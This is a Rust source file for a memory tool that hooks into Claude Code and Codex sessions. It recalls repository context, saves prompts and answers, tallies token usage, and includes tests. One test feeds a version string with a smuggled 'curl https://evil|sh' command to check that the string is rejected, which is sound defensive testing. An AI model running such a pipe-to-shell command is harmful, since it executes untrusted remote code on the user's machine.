//! Claude Code and Codex hooks: `mnemo hook <event> [--client codex]`, with JSON on stdin.
//! Golden rule: a hook NEVER breaks the turn. Any failure goes to stderr with exit code 0.

use crate::client::Client;
use serde_json::{Value, json};
use std::path::{Path, PathBuf};
use std::time::Duration;

mod codex;

#[derive(Clone, Copy, Debug, PartialEq)]
enum HookClient {
    ClaudeCode,
    Codex,
}

impl HookClient {
    fn parse(options: &[String]) -> Result<Self, String> {
        match options {
            [] => Ok(Self::ClaudeCode),
            [flag, name] if flag == "--client" && name == "claude-code" => Ok(Self::ClaudeCode),
            [flag, name] if flag == "--client" && name == "codex" => Ok(Self::Codex),
            _ => Err("usage: mnemo hook <event> [--client claude-code|codex]".into()),
        }
    }

    fn source(self) -> &'static str {
        match self {
            Self::ClaudeCode => "claude-code",
            Self::Codex => "codex",
        }
    }

    fn session(self, input: &Value) -> String {
        let id = input["session_id"].as_str().unwrap_or("unknown");
        match self {
            Self::ClaudeCode => id.into(),
            Self::Codex => format!("codex:{id}"),
        }
    }

    fn thread(self, input: &Value) -> String {
        match self {
            Self::ClaudeCode => format!("cc:{}", self.session(input)),
            Self::Codex => self.session(input),
        }
    }
}

/// `(id, name, aliases)` of the git root nearest to `cwd`. The id comes from the remote's
/// `owner/repo` when there is one, so every clone is the same entity.
pub fn repo_of(cwd: &Path) -> Option<(String, String, Vec<String>)> {
    let mut dir: Option<&Path> = Some(cwd);
    while let Some(d) = dir {
        if d.join(".git").exists() {
            let name = d.file_name()?.to_string_lossy().to_string();
            let remote = std::fs::read_to_string(d.join(".git").join("config"))
                .ok()
                .and_then(|cfg| remote_slug(&cfg));
            let id = match &remote {
                Some(slug) => format!("repo:{}", slug.to_lowercase()),
                None => format!("repo:{}", name.to_lowercase()),
            };
            let mut aliases = vec![name.clone()];
            if let Some(slug) = &remote {
                aliases.push(slug.clone());
            }
            return Some((id, name, aliases));
        }
        dir = d.parent();
    }
    None
}

pub fn remote_slug(cfg: &str) -> Option<String> {
    let mut in_origin = false;
    for line in cfg.lines() {
        let l = line.trim();
        if l.starts_with('[') {
            in_origin = l == "[remote \"origin\"]";
            continue;
        }
        if in_origin {
            if let Some(url) = l
                .strip_prefix("url")
                .map(|r| r.trim_start_matches([' ', '=']).trim())
            {
                let path = url
                    .split_once("://")
                    .map(|(_, r)| r.split_once('/').map(|(_, p)| p).unwrap_or(""))
                    .or_else(|| url.split_once(':').map(|(_, p)| p))?;
                let slug = path.trim_end_matches(".git").trim_matches('/');
                return (slug.split('/').count() >= 2).then(|| slug.to_string());
            }
        }
    }
    None
}

fn context(event: &str, text: &str) -> String {
    output(event, Some(text), None).unwrap_or_default()
}

/// `systemMessage` is shown to the person and not read by the model.
fn output(event: &str, text: Option<&str>, notice: Option<&str>) -> Option<String> {
    let text = text.filter(|t| !t.trim().is_empty());
    if text.is_none() && notice.is_none() {
        return None;
    }
    let mut out = json!({});
    if let Some(t) = text {
        // Claude Code caps additionalContext at 10,000 characters.
        out["hookSpecificOutput"] = json!({"hookEventName": event, "additionalContext": t.chars().take(9500).collect::<String>()});
    }
    if let Some(n) = notice {
        out["systemMessage"] = json!(n);
    }
    Some(out.to_string())
}

/// The server's version reaches the person as a mnemo notice, so only the shape `version()`
/// produces ("0.1.0 (4aabb14)") is accepted. Without a commit on either side: no notice.
pub fn version_notice(client: &str, server: &str) -> Option<String> {
    let (c, s) = (build_commit(client)?, build_commit(server)?);
    (c != s).then(|| {
        format!(
            "mnemo: this client is {client} and the server is {server}; update it with `mnemo update`"
        )
    })
}

fn build_commit(v: &str) -> Option<&str> {
    let (pkg, rest) = v.split_once(" (")?;
    let commit = rest.strip_suffix(')')?;
    let pkg_ok = !pkg.is_empty()
        && pkg.len() <= 32
        && pkg
            .chars()
            .all(|c| c.is_ascii_alphanumeric() || matches!(c, '.' | '+' | '-'));
    let commit_ok =
        (7..=40).contains(&commit.len()) && commit.chars().all(|c| c.is_ascii_hexdigit());
    (pkg_ok && commit_ok).then_some(commit)
}

fn now_ms() -> i64 {
    crate::app::now_ms()
}

#[derive(Debug, Default, PartialEq)]
pub struct TurnUsage {
    pub model: String,
    pub input: u64,
    pub cache_read: u64,
    pub cache_creation: u64,
    pub output: u64,
    pub calls: u64,
}

pub fn turn_usage(transcript: &str) -> TurnUsage {
    let mut u = TurnUsage::default();
    let mut seen = std::collections::HashSet::new();
    for line in transcript.lines().rev() {
        let Ok(d) = serde_json::from_str::<Value>(line) else {
            continue;
        };
        if d["isSidechain"] == true || d["isMeta"] == true {
            continue;
        }
        match d["type"].as_str() {
            Some("user") => {
                let c = &d["message"]["content"];
                let tool_result = c
                    .as_array()
                    .is_some_and(|parts| parts.iter().any(|p| p["type"] == "tool_result"));
                if !tool_result {
                    break;
                }
            }
            Some("assistant") => {
                let m = &d["message"];
                // A streamed response repeats its id over several lines; the last one (the first
                // when walking backwards) carries the final usage.
                if !seen.insert(m["id"].as_str().unwrap_or("").to_string()) {
                    continue;
                }
                let n = |k: &str| m["usage"][k].as_u64().unwrap_or(0);
                u.input += n("input_tokens");
                u.cache_read += n("cache_read_input_tokens");
                u.cache_creation += n("cache_creation_input_tokens");
                u.output += n("output_tokens");
                u.calls += 1;
                if u.model.is_empty() {
                    u.model = m["model"].as_str().unwrap_or("").to_string();
                }
            }
            _ => {}
        }
    }
    u
}

async fn session_start(
    c: &Client,
    input: &Value,
    client: HookClient,
) -> Result<Option<String>, String> {
    let (memory, who) = tokio::join!(session_memory(c, input, client), c.get("/v1/whoami"));
    let notice = who
        .ok()
        .and_then(|w| version_notice(&crate::version(), w["version"].as_str()?));
    let memory = match memory {
        Ok(m) => m,
        Err(e) if notice.is_some() => {
            eprintln!("mnemo: {e}");
            None
        }
        Err(e) => return Err(e),
    };
    Ok(output("SessionStart", memory.as_deref(), notice.as_deref()))
}

async fn session_memory(
    c: &Client,
    input: &Value,
    client: HookClient,
) -> Result<Option<String>, String> {
    let session = client.session(input);
    let source = input["source"].as_str().unwrap_or("startup");
    let cwd = PathBuf::from(input["cwd"].as_str().unwrap_or("."));
    let Some((id, name, aliases)) = repo_of(&cwd) else {
        // The context still starts from scratch: mark it, or what is injected later in this
        // session would be taken as already seen.
        c.post("/v1/recall", &json!({"query": "", "surface": "session_start", "session": session, "source": source, "raw": "off", "semantic": "off"})).await?;
        return Ok(None);
    };
    if let Err(e) = c.post("/v1/entities", &json!({"entities": [{"id": id, "kind": "repo", "name": name, "aliases": aliases, "source": client.source()}]})).await {
        log::warn!("repo entity: {e}");
    }
    let out = c.post("/v1/recall", &json!({"query": format!("What do we know about the {name} repository?"), "entities": [id], "budget_tokens": 900, "raw": "off", "semantic": "off", "deadline_ms": 1500,
        "surface": "session_start", "session": session, "source": source, "thread": client.thread(input)})).await?;
    let text = out["text"].as_str().unwrap_or("");
    Ok((!text.trim().is_empty()).then(|| text.to_string()))
}

async fn prompt(c: &Client, input: &Value, client: HookClient) -> Result<Option<String>, String> {
    let text = input["prompt"].as_str().unwrap_or("");
    if text.trim().is_empty() {
        return Ok(None);
    }
    let session = client.session(input);
    let thread = client.thread(input);
    let cwd = PathBuf::from(input["cwd"].as_str().unwrap_or("."));
    // The repo is where the session runs, not what it is about: only its name, never an entity
    // link, or everything distilled here would be tied to it.
    let repo = repo_of(&cwd);
    let internal = crate::ops::is_internal_prompt(text);
    let ep = json!({"episode_id": format!("{thread}:{}:u", now_ms()), "thread": thread, "source": "chat",
        "role": if internal { "tool" } else { "user" }, "agent": client.source(),
        "occurred_at": now_ms(), "text": text, "project_id": repo.as_ref().map(|r| r.1.clone()).unwrap_or_default()});
    let save_body = json!({"episodes": [ep]});
    if internal {
        c.post("/v1/episodes", &save_body).await?;
        return Ok(None);
    }
    let recall_body = json!({"query": text, "budget_tokens": 900, "raw": "off", "semantic": "off", "deadline_ms": 1500,
        "surface": "prompt", "session": session, "thread": client.thread(input)});
    let save = c.post("/v1/episodes", &save_body);
    let recall = c.post("/v1/recall", &recall_body);
    let (saved, found) = tokio::join!(save, recall);
    if let Err(e) = saved {
        eprintln!("mnemo: could not save the prompt: {e}");
    }
    let out = found?;
    let mem = out["text"].as_str().unwrap_or("");
    Ok((!mem.trim().is_empty()).then(|| context("UserPromptSubmit", mem)))
}

async fn stop(c: &Client, input: &Value, client: HookClient) -> Result<Option<String>, String> {
    let text = input["last_assistant_message"].as_str().unwrap_or("");
    if text.trim().is_empty() {
        return Ok(None);
    }
    let session = client.session(input);
    let thread = client.thread(input);
    let ep = json!({"episode_id": format!("{thread}:{}:a", now_ms()), "thread": thread, "source": "chat", "role": "assistant", "agent": client.source(),
        "occurred_at": now_ms(), "text": text});
    c.post("/v1/episodes", &json!({"episodes": [ep]})).await?;
    let transcript = input["transcript_path"]
        .as_str()
        .and_then(|p| std::fs::read_to_string(p).ok())
        .unwrap_or_default();
    let usage = match client {
        HookClient::ClaudeCode => turn_usage(&transcript),
        HookClient::Codex => match codex::turn_usage(&transcript, input) {
            Some(usage) => usage,
            None => {
                // Optional transcript with an unstable format: no usage beats a false zero.
                eprintln!(
                    "mnemo: answer saved; the Codex token usage is not available for this turn"
                );
                return Ok(None);
            }
        },
    };
    c.post("/v1/turns", &json!({"session": session, "source": client.source(), "model": usage.model, "input_tokens": usage.input,
        "cache_read_tokens": usage.cache_read, "cache_creation_tokens": usage.cache_creation, "output_tokens": usage.output, "calls": usage.calls, "answer": text})).await?;
    Ok(None)
}

pub async fn run(args: &[String]) {
    let Some(event) = args.first() else {
        eprintln!("mnemo: missing hook event");
        return;
    };
    let client = match HookClient::parse(&args[1..]) {
        Ok(client) => client,
        Err(e) => {
            eprintln!("mnemo: {e}");
            return;
        }
    };
    let mut raw = String::new();
    if std::io::Read::read_to_string(&mut std::io::stdin(), &mut raw).is_err() {
        return;
    }
    let input: Value = serde_json::from_str(&raw).unwrap_or(Value::Null);
    // Synchronous hooks get a short deadline: the user is waiting. Codex runs `stop`
    // synchronously too, so it is not lost when `codex exec` exits.
    let timeout = if event == "stop" && client == HookClient::ClaudeCode {
        Duration::from_secs(20)
    } else {
        Duration::from_secs(3)
    };
    let c = match Client::from_env(timeout) {
        Ok(c) => c,
        Err(e) => {
            eprintln!("mnemo: {e}");
            return;
        }
    };
    if let Err(e) = c.ensure().await {
        eprintln!("mnemo: {e}");
        return;
    }
    let res = match event.as_str() {
        "session-start" => session_start(&c, &input, client).await,
        "prompt" => prompt(&c, &input, client).await,
        "stop" => stop(&c, &input, client).await,
        other => Err(format!("unknown event: {other}")),
    };
    match res {
        Ok(Some(out)) => println!("{out}"),
        Ok(None) => {}
        Err(e) => eprintln!("mnemo: {e}"),
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn clients_keep_separate_sessions_without_changing_claude_ids() {
        let input = json!({"session_id":"same-id"});
        assert_eq!(HookClient::parse(&[]).unwrap(), HookClient::ClaudeCode);
        assert_eq!(
            HookClient::parse(&["--client".into(), "codex".into()]).unwrap(),
            HookClient::Codex
        );
        assert!(HookClient::parse(&["--client".into(), "unknown".into()]).is_err());
        assert_eq!(HookClient::ClaudeCode.session(&input), "same-id");
        assert_eq!(HookClient::ClaudeCode.thread(&input), "cc:same-id");
        assert_eq!(HookClient::Codex.session(&input), "codex:same-id");
        assert_eq!(HookClient::Codex.thread(&input), "codex:same-id");
    }

    #[tokio::test]
    async fn codex_hooks_recall_and_store_the_turn_with_its_real_source_and_usage() {
        use axum::{Json, Router, extract::State, http::Uri, routing::post};
        use std::sync::{Arc, Mutex};

        type Requests = Arc<Mutex<Vec<(String, Value)>>>;
        async fn receive(
            State(requests): State<Requests>,
            uri: Uri,
            Json(body): Json<Value>,
        ) -> Json<Value> {
            requests.lock().unwrap().push((uri.path().into(), body));
            Json(json!({"text":"Remember the repository's previous decisions."}))
        }
        let requests = Requests::default();
        let app = Router::new()
            .fallback(post(receive))
            .with_state(requests.clone());
        let listener = tokio::net::TcpListener::bind("127.0.0.1:0").await.unwrap();
        let client = Client::new(
            &format!("http://{}", listener.local_addr().unwrap()),
            "test-key",
            Duration::from_secs(2),
        )
        .unwrap();
        let server = tokio::spawn(async move { axum::serve(listener, app).await.unwrap() });
        let dir =
            std::env::temp_dir().join(format!("mnemo-codex-{}", uuid::Uuid::new_v4().simple()));
        std::fs::create_dir_all(dir.join(".git")).unwrap();
        std::fs::write(
            dir.join(".git/config"),
            "[remote \"origin\"]\nurl = https://github.com/acme/widget.git\n",
        )
        .unwrap();
        let transcript = dir.join("transcript.jsonl");
        std::fs::write(&transcript, json!({"type":"token_usage_record","payload":{
            "session_id":"test-session","turn_id":"test-turn","response_id":"response",
            "usage":{"input_tokens":100,"cached_input_tokens":80,"output_tokens":15,"reasoning_output_tokens":5}
        }}).to_string()).unwrap();
        let event = json!({"session_id":"test-session","turn_id":"test-turn","model":"codex-model",
            "cwd":dir,"source":"startup","prompt":"Why was this changed?",
            "last_assistant_message":"The change fixed the timeout.","transcript_path":transcript});
        for (name, output) in [
            (
                "SessionStart",
                session_start(&client, &event, HookClient::Codex)
                    .await
                    .unwrap(),
            ),
            (
                "UserPromptSubmit",
                prompt(&client, &event, HookClient::Codex).await.unwrap(),
            ),
        ] {
            let output: Value = serde_json::from_str(&output.unwrap()).unwrap();
            assert_eq!(output["hookSpecificOutput"]["hookEventName"], name);
            assert!(
                output["hookSpecificOutput"]["additionalContext"]
                    .as_str()
                    .unwrap()
                    .contains("previous decisions")
            );
        }
        assert!(
            stop(&client, &event, HookClient::Codex)
                .await
                .unwrap()
                .is_none()
        );
        {
            let sent = requests.lock().unwrap();
            assert_eq!(
                sent.iter().filter(|(path, _)| path == "/v1/recall").count(),
                2
            );
            for (path, body) in sent.iter() {
                match path.as_str() {
                    "/v1/entities" => assert_eq!(body["entities"][0]["source"], "codex"),
                    "/v1/recall" => assert_eq!(body["session"], "codex:test-session"),
                    "/v1/episodes" => {
                        assert_eq!(body["episodes"][0]["agent"], "codex");
                        assert_eq!(body["episodes"][0]["thread"], "codex:test-session");
                        assert!(
                            body["episodes"][0]["episode_id"]
                                .as_str()
                                .unwrap()
                                .starts_with("codex:test-session:")
                        );
                    }
                    "/v1/turns" => {
                        assert_eq!(body["source"], "codex");
                        assert_eq!(body["session"], "codex:test-session");
                        assert_eq!(body["model"], "codex-model");
                        assert_eq!(body["input_tokens"], 20);
                        assert_eq!(body["cache_read_tokens"], 80);
                        assert_eq!(body["output_tokens"], 15);
                        assert_eq!(body["calls"], 1);
                    }
                    _ => panic!("unexpected path: {path}"),
                }
            }
            assert_eq!(sent.len(), 6);
        }
        requests.lock().unwrap().clear();
        let mut missing = event.clone();
        missing["transcript_path"] = Value::Null;
        stop(&client, &missing, HookClient::Codex).await.unwrap();
        assert_eq!(requests.lock().unwrap().len(), 1);
        assert_eq!(requests.lock().unwrap()[0].0, "/v1/episodes");

        requests.lock().unwrap().clear();
        prompt(&client, &event, HookClient::ClaudeCode)
            .await
            .unwrap();
        {
            let sent = requests.lock().unwrap();
            let body = &sent
                .iter()
                .find(|(path, _)| path == "/v1/episodes")
                .unwrap()
                .1;
            assert_eq!(body["episodes"][0]["agent"], "claude-code");
            assert_eq!(body["episodes"][0]["thread"], "cc:test-session");
        }
        server.abort();
        std::fs::remove_dir_all(dir).unwrap();
    }

    #[test]
    fn remote_slugs_from_https_and_ssh() {
        let https = "[core]\n\tbare = false\n[remote \"origin\"]\n\turl = https://github.com/acme/mnemo.git\n\tfetch = +refs/heads/*\n";
        assert_eq!(remote_slug(https).as_deref(), Some("acme/mnemo"));
        let ssh = "[remote \"upstream\"]\n\turl = git@github.com:other/x.git\n[remote \"origin\"]\n\turl = git@gitlab.com:group/sub/repo.git\n";
        assert_eq!(remote_slug(ssh).as_deref(), Some("group/sub/repo"));
        assert_eq!(
            remote_slug("[remote \"origin\"]\n\turl = /tmp/local\n"),
            None
        );
    }

    #[test]
    fn repo_is_found_from_a_subdirectory() {
        let dir =
            std::env::temp_dir().join(format!("mnemo-hook-{}", uuid::Uuid::new_v4().simple()));
        std::fs::create_dir_all(dir.join(".git")).unwrap();
        std::fs::create_dir_all(dir.join("src/deep")).unwrap();
        std::fs::write(
            dir.join(".git/config"),
            "[remote \"origin\"]\n\turl = https://github.com/Acme/Widget.git\n",
        )
        .unwrap();
        let (id, _, aliases) = repo_of(&dir.join("src/deep")).unwrap();
        assert_eq!(id, "repo:acme/widget");
        assert!(aliases.contains(&"Acme/Widget".to_string()));
        std::fs::remove_dir_all(dir).ok();
    }

    #[test]
    fn turn_usage_sums_the_last_turn_only() {
        let lines = [
            r#"{"type":"user","message":{"role":"user","content":"first question"}}"#,
            r#"{"type":"assistant","message":{"id":"a0","model":"m","usage":{"input_tokens":999,"output_tokens":999}}}"#,
            r#"{"type":"user","message":{"role":"user","content":"second question"}}"#,
            r#"{"type":"assistant","message":{"id":"a1","model":"claude-x","usage":{"input_tokens":5,"cache_read_input_tokens":100,"cache_creation_input_tokens":10,"output_tokens":1}}}"#,
            r#"{"type":"assistant","message":{"id":"a1","model":"claude-x","usage":{"input_tokens":5,"cache_read_input_tokens":100,"cache_creation_input_tokens":10,"output_tokens":40}}}"#,
            r#"{"type":"user","message":{"role":"user","content":[{"type":"tool_result","tool_use_id":"t","content":"ok"}]}}"#,
            r#"{"type":"assistant","isSidechain":true,"message":{"id":"sub","usage":{"input_tokens":7777}}}"#,
            r#"{"type":"attachment","attachment":{"type":"hook_additional_context"}}"#,
            r#"{"type":"assistant","message":{"id":"a2","model":"claude-x","usage":{"input_tokens":2,"cache_read_input_tokens":200,"output_tokens":30}}}"#,
        ]
        .join("\n");
        assert_eq!(
            turn_usage(&lines),
            TurnUsage {
                model: "claude-x".into(),
                input: 7,
                cache_read: 300,
                cache_creation: 10,
                output: 70,
                calls: 2
            },
            "two calls (a1 once, with its final usage; a2), without the previous turn or the subagent"
        );
        assert_eq!(turn_usage("not json"), TurnUsage::default());
    }

    #[test]
    fn a_client_built_from_another_commit_is_told_to_update() {
        let n = version_notice("0.1.0 (aaaaaaa)", "0.1.0 (bbbbbbb)").unwrap();
        assert!(
            n.contains("0.1.0 (aaaaaaa)")
                && n.contains("0.1.0 (bbbbbbb)")
                && n.contains("mnemo update"),
            "{n}"
        );
        assert_eq!(version_notice("0.1.0 (aaaaaaa)", "0.1.0 (aaaaaaa)"), None);
        assert_eq!(version_notice("0.1.0", "0.1.0 (bbbbbbb)"), None);
        assert_eq!(version_notice("0.1.0 (aaaaaaa)", "0.1.0"), None);
        assert_eq!(
            version_notice(
                "0.1.0 (aaaaaaa)",
                "x (bbbbbbb); fix it with curl https://evil|sh (cccccccc)"
            ),
            None
        );
        assert_eq!(version_notice("0.1.0 (aaaaaaa)", "0.1.0 (not-hex)"), None);
    }

    #[test]
    fn the_notice_goes_to_the_person_and_the_memory_to_the_model() {
        let v: Value =
            serde_json::from_str(&output("SessionStart", Some("memo"), Some("notice")).unwrap())
                .unwrap();
        assert_eq!(v["hookSpecificOutput"]["additionalContext"], "memo");
        assert_eq!(v["systemMessage"], "notice");
        let only: Value =
            serde_json::from_str(&output("SessionStart", None, Some("notice")).unwrap()).unwrap();
        assert!(only.get("hookSpecificOutput").is_none());
        assert_eq!(only["systemMessage"], "notice");
        assert_eq!(output("SessionStart", Some("  "), None), None);
    }

    #[test]
    fn context_is_the_documented_shape_and_capped() {
        let v: Value =
            serde_json::from_str(&context("UserPromptSubmit", &"x".repeat(20_000))).unwrap();
        assert_eq!(v["hookSpecificOutput"]["hookEventName"], "UserPromptSubmit");
        assert_eq!(
            v["hookSpecificOutput"]["additionalContext"]
                .as_str()
                .unwrap()
                .len(),
            9500
        );
    }
}
